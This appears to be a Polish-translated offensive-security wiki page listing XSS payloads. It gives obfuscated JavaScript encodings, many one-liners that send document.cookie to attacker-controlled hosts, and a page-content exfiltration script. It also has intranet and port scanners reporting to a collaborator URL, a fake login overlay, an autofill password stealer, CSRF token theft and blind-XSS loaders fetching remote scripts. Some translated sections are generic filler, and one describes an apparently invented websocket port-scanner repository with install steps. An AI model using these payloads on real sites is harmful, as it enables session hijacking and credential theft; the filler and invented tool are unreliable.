* [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
* [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
```

```javascript
//aaencode
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## Wspólne ładunki XSS

### Kilka ładunków w jednym

{% content-ref url="steal-info-js.md" %}
[steal-info-js.md](steal-info-js.md)
{% endcontent-ref %}

### Pobierz ciasteczka
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
{% hint style="info" %}
Jeśli flaga HTTPOnly jest ustawiona w pliku cookie, **nie będziesz w stanie uzyskać dostępu do ciasteczek za pomocą JavaScript**. Ale tutaj masz [kilka sposobów na obejście tej ochrony](../hacking-with-cookies/#httponly), jeśli masz szczęście.
{% endhint %}

### Kradnij zawartość strony
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8";
var attacker = "http://10.10.14.8/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open('GET', url, true);
xhr.send(null);
```
### Znajdź wewnętrzne adresy IP

W celu znalezienia wewnętrznych adresów IP możesz wykorzystać różne techniki. Poniżej przedstawiam kilka z nich:

#### 1. Wykorzystanie narzędzi do skanowania sieci

Możesz użyć narzędzi takich jak Nmap lub Masscan do skanowania sieci w celu znalezienia wewnętrznych adresów IP. Te narzędzia umożliwiają skanowanie całej sieci lub określonych podsieci w poszukiwaniu aktywnych hostów.

Przykład użycia Nmap:

```
nmap -sn 192.168.0.0/24
```

#### 2. Analiza nagłówków HTTP

Podczas przeglądania strony internetowej, możesz sprawdzić nagłówki HTTP odpowiedzi, aby znaleźć wewnętrzne adresy IP. Czasami serwer może ujawnić swoje wewnętrzne adresy IP w nagłówkach odpowiedzi.

Przykład użycia narzędzia cURL:

```
curl -I example.com
```

#### 3. Wykorzystanie ataków XSS

Jeśli masz dostęp do strony internetowej, możesz spróbować wykorzystać ataki XSS (Cross-Site Scripting), aby uzyskać wewnętrzne adresy IP. Atak XSS pozwala na wstrzyknięcie złośliwego kodu JavaScript na stronie, który może zbierać informacje, w tym adresy IP.

#### 4. Analiza plików konfiguracyjnych

Jeśli masz dostęp do serwera, możesz sprawdzić pliki konfiguracyjne, takie jak pliki konfiguracyjne serwera WWW (np. Apache, Nginx) lub pliki konfiguracyjne aplikacji, aby znaleźć wewnętrzne adresy IP.

#### 5. Wykorzystanie narzędzi do wykrywania podatności

Możesz również skorzystać z narzędzi do wykrywania podatności, takich jak Nessus lub OpenVAS, które mogą pomóc w identyfikacji wewnętrznych adresów IP poprzez skanowanie systemów pod kątem znanych podatności.

Pamiętaj, że w celu znalezienia wewnętrznych adresów IP musisz mieć odpowiednie uprawnienia i zgodę na przeprowadzenie takich działań.
```html
<script>
var q = []
var collaboratorURL = 'http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net';
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for(i=1;i<=255;i++){
q.push(
function(url){
return function(){
fetchUrl(url, wait);
}
}('http://192.168.0.'+i+':8080'));
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for(i=1; i<=n_threads; i++){
if(q.length) q.shift()();
}

function fetchUrl(url, wait){
console.log(url)
var controller = new AbortController(), signal = controller.signal;
fetch(url, {signal}).then(r=>r.text().then(text=>
{
location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
}
))
.catch(e => {
if(!String(e).includes("The user aborted a request") && q.length) {
q.shift()();
}
});

setTimeout(x=>{
controller.abort();
if(q.length) {
q.shift()();
}
}, wait);
}
</script>
```
### Skaner portów (fetch)

This technique allows an attacker to scan for open ports on a target system using the `fetch` function in JavaScript. By sending requests to different ports and analyzing the responses, the attacker can determine which ports are open and potentially vulnerable to further exploitation.

To perform a port scan using `fetch`, the attacker can iterate through a range of port numbers and send HTTP requests to each port using the `fetch` function. If the response status code is 200, it indicates that the port is open and accessible. On the other hand, if the response status code is 404 or any other error code, it suggests that the port is closed or filtered.

Here is an example of how to implement a basic port scanner using `fetch` in JavaScript:

```javascript
async function portScan(target, startPort, endPort) {
  for (let port = startPort; port <= endPort; port++) {
    try {
      const response = await fetch(`http://${target}:${port}`);
      if (response.status === 200) {
        console.log(`Port ${port} is open`);
      }
    } catch (error) {
      // Port is closed or filtered
    }
  }
}

// Usage
portScan('target.com', 1, 1000);
```

It is important to note that port scanning is a potentially intrusive activity and may be illegal or against the terms of service of certain systems. Always ensure that you have proper authorization and legal permission before conducting any port scanning activities.
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Skaner portów (websockets)

Websockets to protokół komunikacyjny, który umożliwia dwukierunkową komunikację między klientem a serwerem. Skaner portów (websockets) to narzędzie, które może być używane do skanowania otwartych portów na serwerze, który obsługuje websockets.

#### Instalacja

Aby zainstalować skaner portów (websockets), wykonaj następujące kroki:

1. Sklonuj repozytorium z narzędziem skanującym porty (websockets) z [adresu URL](https://github.com/hacktricks/PortScan).

   ```bash
   git clone https://github.com/hacktricks/PortScan
   ```

2. Przejdź do katalogu PortScan.

   ```bash
   cd PortScan
   ```

3. Zainstaluj wymagane zależności.

   ```bash
   pip install -r requirements.txt
   ```

#### Użycie

Aby uruchomić skaner portów (websockets), wykonaj poniższą komendę:

```bash
python3 portscan.py <adres_IP> <port_początkowy> <port_końcowy>
```

Gdzie:
- `<adres_IP>` to adres IP serwera, który chcesz zeskanować.
- `<port_początkowy>` to numer pierwszego portu w zakresie, który chcesz zeskanować.
- `<port_końcowy>` to numer ostatniego portu w zakresie, który chcesz zeskanować.

Przykład użycia:

```bash
python3 portscan.py 192.168.0.1 1 1000
```

#### Wyniki

Skaner portów (websockets) zwróci informacje o otwartych portach na serwerze. Wyniki będą wyświetlane w formacie:

```
Port <numer_portu>: <status>
```

Gdzie:
- `<numer_portu>` to numer zeskanowanego portu.
- `<status>` to status portu (otwarty/zamknięty).

#### Uwagi

- Pamiętaj, że skanowanie portów bez zgody właściciela serwera jest nielegalne. Upewnij się, że masz odpowiednie uprawnienia i zgodę przed przeprowadzeniem skanowania.
- Skanowanie portów może być wykrywane przez systemy zabezpieczeń i być uznane za podejrzane działanie. Wykonuj skanowanie tylko na własnych systemach lub na systemach, do których masz uprawnienia.
- Skanowanie portów może być czasochłonne, szczególnie jeśli skanujesz szeroki zakres portów. Bądź cierpliwy i poczekaj, aż skanowanie zostanie zakończone.
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Krótkie czasy wskazują na odpowiedź portu._ _Dłuższe czasy wskazują na brak odpowiedzi._

Przejrzyj listę zablokowanych portów w przeglądarce Chrome [**tutaj**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net\_util.cc) oraz w przeglądarce Firefox [**tutaj**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Pole do wprowadzenia danych uwierzytelniających
```markup
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Przechwytywanie haseł automatycznego wypełniania

Auto-fill passwords are a convenient feature that allows users to save and automatically fill in their login credentials on websites. However, this feature can also be exploited by attackers to capture sensitive information.

#### How it works

When a user saves their login credentials for a website, the browser stores this information in its password manager. The next time the user visits the same website, the browser automatically fills in the saved credentials.

Attackers can take advantage of this feature by injecting malicious code into a website. This code can be designed to capture the auto-filled passwords and send them to the attacker's server.

#### Exploiting auto-fill passwords

To exploit auto-fill passwords, an attacker needs to find a vulnerability in the target website that allows them to inject malicious code. This can be done through various techniques, such as cross-site scripting (XSS) or remote code execution (RCE).

Once the malicious code is injected, it can capture the auto-filled passwords by listening for the browser's auto-fill events. The captured passwords can then be sent to the attacker's server for further exploitation.

#### Mitigating the risk

To mitigate the risk of auto-fill password capture, website owners should follow secure coding practices and regularly update their software to patch any vulnerabilities. Additionally, users should be cautious when saving their login credentials and only do so on trusted websites.

Users can also disable the auto-fill password feature in their browser settings to prevent any potential exploitation. However, this may reduce convenience and require manual entry of login credentials on every visit to a website.

#### Conclusion

Auto-fill passwords can be a time-saving feature for users, but they also pose a security risk if not properly implemented and secured. Both website owners and users should take necessary precautions to protect against auto-fill password capture attacks.
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
Kiedy wprowadzone są jakiekolwiek dane w polu hasła, nazwa użytkownika i hasło są wysyłane na serwer atakującego, nawet jeśli klient wybierze zapisane hasło i nic nie wpisze, dane uwierzytelniające zostaną wykradzione.

### Keylogger

Przeszukując github, znalazłem kilka różnych:

* [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
* [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
* [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
* Możesz również użyć metasploita `http_javascript_keylogger`

### Kradzież tokenów CSRF
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Kradzież wiadomości PostMessage

W przypadku ataku XSS (Cross-Site Scripting) na stronie internetowej, można wykorzystać funkcję `PostMessage` do kradzieży wiadomości. Funkcja `PostMessage` umożliwia komunikację między różnymi oknami i ramkami przeglądarki. Atakujący może wykorzystać tę funkcję do przechwycenia i odczytania wiadomości wysyłanych między oknami.

Aby przeprowadzić atak, atakujący musi wstrzyknąć złośliwy skrypt na stronie internetowej, który będzie nasłuchiwał na wiadomości wysyłane za pomocą `PostMessage`. Skrypt ten może przechwycić wiadomości i przesłać je do kontrolowanego przez atakującego serwera.

Atakujący może również wykorzystać funkcję `PostMessage` do wysyłania fałszywych wiadomości, które mogą wpływać na zachowanie strony internetowej lub wywoływać inne niepożądane działania.

Aby zabezpieczyć się przed tym rodzajem ataku, ważne jest, aby odpowiednio filtrować i walidować dane wejściowe, które są używane w funkcji `PostMessage`. Należy również unikać wstrzykiwania złośliwego kodu na stronie internetowej poprzez odpowiednie zabezpieczenie aplikacji przed atakami XSS.
```markup
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### Wykorzystywanie Service Workers

{% content-ref url="abusing-service-workers.md" %}
[abusing-service-workers.md](abusing-service-workers.md)
{% endcontent-ref %}

### Uzyskiwanie dostępu do Shadow DOM

{% content-ref url="shadow-dom.md" %}
[shadow-dom.md](shadow-dom.md)
{% endcontent-ref %}

### Poligloty

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt" %}

### Payloady Blind XSS

Możesz również użyć: [https://xsshunter.com/](https://xsshunter.com)
```markup
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```
### Regex - Dostęp do ukrytej zawartości

Z [**tego opisu**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) można dowiedzieć się, że nawet jeśli niektóre wartości znikają z JS, wciąż można je znaleźć w atrybutach JS w różnych obiektach. Na przykład, po usunięciu wartości wejściowej regexa, wciąż można ją znaleźć.
```javascript
// Do regex with flag
flag="CTF{FLAG}"
re=/./g
re.test(flag);

// Remove flag value, nobody will be able to get it, right?
flag=""

// Access previous regex input
console.log(RegExp.input)
